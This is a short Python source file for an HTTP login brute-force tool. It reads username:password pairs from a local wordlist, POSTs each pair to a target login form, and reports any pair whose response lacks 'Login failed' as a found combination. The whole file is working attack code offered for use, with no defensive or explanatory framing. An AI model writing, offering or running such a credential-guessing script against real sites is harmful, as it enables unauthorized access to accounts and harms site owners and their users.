# Python Script for HTTP Brute Force

# Importing Modules
import requests, os
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RESET = Fore.RESET

class HTTP_brute:
    def httpbrute(hostname, username, password):
        # Data needed
        data = {'username':username, 'password':password, "Login":'submit'}

        send_data_url = requests.post(hostname, data=data)
        if "Login failed" in str(send_data_url.content):
            print(f"[!] Invalid credentials for {username}:{password}")
        else:
            print(f"{GREEN}[+] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
            return True

    def run(hostname):
        # Read the file
        parent_dir = os.getcwd()
        wordlist_path = os.path.join(parent_dir, "data", "wordlists")
        credlist = open(wordlist_path + '/http_wordlist.txt').read().splitlines()

        # Start the brute force
        for cred in credlist:
            username = cred.split(':')[0]
            password = cred.split(':')[1]

            if HTTP_brute.httpbrute(hostname, username, password):
                break
